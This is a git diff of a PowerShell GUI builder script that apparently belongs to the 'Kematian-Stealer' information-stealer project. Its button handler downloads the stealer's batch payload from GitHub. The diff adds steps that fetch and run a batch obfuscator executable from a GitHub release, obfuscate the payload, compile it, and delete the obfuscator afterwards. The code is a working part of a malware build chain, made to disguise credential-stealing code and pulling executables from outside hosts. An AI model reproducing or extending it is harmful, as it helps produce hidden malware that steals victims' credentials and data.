@@ -121,7 +121,7 @@ $button.Add_Click({
         $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
         $filePath = "$env:TEMP\main.bat"
         $filePathprotect = "$env:TEMP\main.bat"
-        
+
         # Download the file
         Invoke-WebRequest -Uri $url -OutFile $filePath
 
@@ -136,13 +136,14 @@ $button.Add_Click({
         # Path to the complie.exe executable
         $compliePath = ".\converter.bat"  # Change this to the correct path
         $protectPath = ".\batchobfuscator.exe"  # Change this to the correct path
-
+        Invoke-WebRequest -Uri "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe" -OutFile $protectPath
         # Execute the .bat file
-        # Start-Process -FilePath $protectPath -ArgumentList "-f $filePath -nu -dc" -NoNewWindow -Wait
+        Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`"" -NoNewWindow -Wait
         Start-Process -FilePath $compliePath -ArgumentList $filePathprotect -NoNewWindow -Wait
 
         # Delete the .bat file after execution
         Remove-item "settings.json"
+        Remove-item $protectPath
         # Show a message box
         [System.Windows.Forms.MessageBox]::Show('Process completed and file deleted.', 'Completed', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
     } else {
